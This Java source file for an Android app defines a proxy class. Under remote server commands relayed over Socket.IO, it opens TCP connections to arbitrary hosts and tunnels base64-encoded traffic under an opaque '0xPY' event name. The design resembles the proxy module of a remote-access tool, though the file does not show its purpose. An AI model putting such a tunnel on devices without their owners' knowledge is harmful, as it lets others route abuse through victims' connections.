package com.fason.app.features.proxy;

import com.fason.app.core.network.SocketClient;

import org.json.JSONObject;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * A single TCP connection that bridges data between
 * the remote server (via Socket.IO) and a target host:port.
 */
public final class ProxyConnection {

    private final String connId;
    private final Socket socket;
    private Thread readerThread;
    private final AtomicBoolean running = new AtomicBoolean(true);
    private long bytesSent = 0;
    private long bytesReceived = 0;

    public ProxyConnection(String connId, String host, int port) throws Exception {
        this.connId = connId;
        this.socket = new Socket();
        this.socket.connect(new InetSocketAddress(host, port), 10000);
    }

    /**
     * Start reading from the target socket and forwarding to server.
     */
    public void start() {
        readerThread = new Thread(() -> {
            try {
                InputStream in = socket.getInputStream();
                byte[] buf = new byte[16384];
                int n;
                while (running.get() && (n = in.read(buf)) != -1) {
                    byte[] chunk = new byte[n];
                    System.arraycopy(buf, 0, chunk, 0, n);
                    bytesReceived += n;

                    JSONObject msg = new JSONObject();
                    msg.put("connId", connId);
                    msg.put("event", "data");
                    msg.put("data", android.util.Base64.encodeToString(chunk, android.util.Base64.NO_WRAP));
                    SocketClient.getInstance().safeEmit("0xPY", msg);
                }
                } catch (Exception e) {
                    // Connection closed or error — ensure full cleanup
                } finally {
                    close(); // close() sets running=false, closes socket, and calls notifyClose()
                }
        }, "proxy-reader-" + connId);
        readerThread.setDaemon(true);
        readerThread.start();

        // Emit connected event
        try {
            JSONObject msg = new JSONObject();
            msg.put("connId", connId);
            msg.put("event", "connected");
            SocketClient.getInstance().safeEmit("0xPY", msg);
        } catch (Exception ignored) {}
    }

    /**
     * Write data received from the server to the target socket.
     */
    public void write(byte[] data) {
        if (!running.get()) return;
        try {
            OutputStream out = socket.getOutputStream();
            out.write(data);
            out.flush();
            bytesSent += data.length;
        } catch (Exception e) {
            close();
        }
    }

    /**
     * Write base64-encoded data received from the server.
     */
    public void writeBase64(String base64Data) {
        if (base64Data == null || base64Data.isEmpty()) return;
        try {
            byte[] data = android.util.Base64.decode(base64Data, android.util.Base64.DEFAULT);
            write(data);
        } catch (Exception e) {
            close();
        }
    }

    /**
     * Close the connection — clean up resources and notify server.
     */
    public void close() {
        if (!running.getAndSet(false)) return; // already closed
        if (readerThread != null) {
            readerThread.interrupt();
            readerThread = null;
        }
        try { socket.close(); } catch (Exception ignored) {}
        notifyClose();
    }

    private void notifyClose() {
        try {
            JSONObject msg = new JSONObject();
            msg.put("connId", connId);
            msg.put("event", "close");
            msg.put("bytesSent", bytesSent);
            msg.put("bytesReceived", bytesReceived);
            SocketClient.getInstance().safeEmit("0xPY", msg);
        } catch (Exception ignored) {}
    }

    public String getConnId() {
        return connId;
    }

    public long getBytesSent() {
        return bytesSent;
    }

    public long getBytesReceived() {
        return bytesReceived;
    }

    public boolean isRunning() {
        return running.get();
    }
}
